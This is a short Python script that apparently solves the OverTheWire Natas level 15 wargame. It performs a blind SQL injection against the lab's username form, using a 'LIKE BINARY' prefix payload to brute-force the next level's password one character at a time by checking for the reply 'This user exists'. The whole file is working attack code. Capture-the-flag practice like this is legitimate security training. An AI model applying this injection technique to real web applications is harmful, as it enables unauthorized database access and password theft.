import requests
import time

password = "REDACTED"
target = "http://natas15.natas.labs.overthewire.org"
target_user = "REDACTED"
query = ""
#resp = requests.post('http://natas15.natas.labs.overthewire.org', auth=('natas15', password))

def bruteforce ():
    bruteword = ""
    a = ""
    alpha=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1','2','3', '4', '5', '6', '7','8', '9', '0','B','E','H','I','N','O','R','W']
    while len(bruteword) < 32:
        for i in range(len(alpha)):
            #q = "natas16 AND password LIKE BINARY'" + bruteword + alpha[i] + "*' ;#"
            q = "natas16\" AND password LIKE BINARY \"" + bruteword + alpha[i] + "%"
            data = {'username':q}
            resp = requests.post(url='http://natas15.natas.labs.overthewire.org', data=data,auth=('natas15', password))
            #time.sleep(0.1)
            if 'This user exists' in resp.text:
                #print(len(resp.content))
                #print(alpha[i])
                bruteword +=alpha[i]
                print(bruteword)
                break

            #if resp.content
bruteforce()
